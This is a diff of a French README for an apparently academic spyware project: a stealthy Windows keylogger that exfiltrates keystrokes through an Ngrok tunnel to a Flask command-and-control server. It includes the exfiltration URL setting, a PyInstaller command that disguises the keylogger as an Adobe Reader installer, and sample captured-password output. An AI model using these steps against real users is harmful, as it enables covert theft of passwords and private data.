@@ -15,11 +15,9 @@ Ce projet a été développé dans un cadre strictement académique pour le Mast
 
 Ce projet implémente une Kill Chain complète simulant une attaque par Spyware. L'architecture repose sur un modèle Client-Serveur (C2 - Command & Control) utilisant un tunnel chiffré pour traverser les pare-feux (NAT Traversal).
 
-Le Payload (Client) : Un exécutable Windows furtif (.exe) qui capture les frappes clavier (Keylogger), filtre les données inutiles et les stocke temporairement.
-
-Le Canal (Tunneling) : Utilisation de Ngrok pour exposer un service local sur Internet via HTTPS, rendant le flux difficile à distinguer du trafic légitime.
-
-Le C2 (Serveur) : Un serveur Python Flask hébergé sur Kali Linux qui réceptionne les données exfiltrées, les affiche en temps réel et assure leur persistance sur disque.
+- Le Payload (Client) : Un exécutable Windows furtif (.exe) qui capture les frappes clavier (Keylogger), filtre les données inutiles et les stocke temporairement.
+- Le Canal (Tunneling) : Utilisation de Ngrok pour exposer un service local sur Internet via HTTPS, rendant le flux difficile à distinguer du trafic légitime.
+- Le C2 (Serveur) : Un serveur Python Flask hébergé sur Kali Linux qui réceptionne les données exfiltrées, les affiche en temps réel et assure leur persistance sur disque.
 
 #### 2. Configuration de l'Attaquant (Kali Linux)
 
@@ -28,16 +26,13 @@ L'infrastructure serveur a été entièrement automatisée via un script Python 
 Prérequis
 
 Python 3 et pip.
-
 Bibliothèques : flask, requests.
-
 Outil : Ngrok (installé et authentifié avec un token).
 
 Fichiers Clés
 
-log_receiver.py : Le cœur du serveur C2 (Flask).
-
-lanceur_serveur.py : Orchestrateur qui gère le tunnel Ngrok et le serveur Flask simultanément.
+- log_receiver.py : Le cœur du serveur C2 (Flask).
+- lanceur_serveur.py : Orchestrateur qui gère le tunnel Ngrok et le serveur Flask simultanément.
 
 🚀 Démarrage de l'Infrastructure
 
@@ -45,8 +40,7 @@ Sur la machine Kali, ouvrez un terminal dans le dossier du projet :
 
 Lancer l'orchestrateur :
 
-python3 lanceur_serveur.py
-
+`python3 lanceur_serveur.py`
 
 Fonctionnement du script :
 
@@ -79,13 +73,13 @@ Ressource : Une icône réaliste (ex: acrobat.ico) placée dans le dossier.
 Configuration de l'URL :
 Ouvrez le fichier keylogger_win_remote.py et modifiez la variable NGROK_URL avec l'adresse fournie par l'attaquant à l'étape précédente :
 
-NGROK_URL = "[https://votre-url-dynamique.ngrok-free.app](https://votre-url-dynamique.ngrok-free.app)"
+`NGROK_URL = "[https://votre-url-dynamique.ngrok-free.app](https://votre-url-dynamique.ngrok-free.app)"`
 
 
 Compilation Furtive :
 Ouvrez l'invite de commande (CMD) dans le dossier du script et exécutez la commande suivante. Elle génère un exécutable unique, sans console, avec l'icône d'Adobe Acrobat :
 
-py -m PyInstaller --onefile --noconsole --hidden-import pynput --icon=acrobat.ico --clean --name Reader_install keylogger_win_remote.py
+`py -m PyInstaller --onefile --noconsole --hidden-import pynput --icon=acrobat.ico --clean --name Reader_install keylogger_win_remote.py`
 
 
 --onefile : Package tout (Python, libs, script) dans un seul .exe.
@@ -119,7 +113,7 @@ Ou attendez 60 secondes (cycle automatique).
 
 Résultat : Sur le terminal Kali, vous verrez apparaître :
 
-[+] Log reçu : MonMotDePasseSecret123
+`[+] Log reçu : MonMotDePasseSecret123`
 
 
 Les données sont également archivées dans logs_exfiltres_recus.txt.
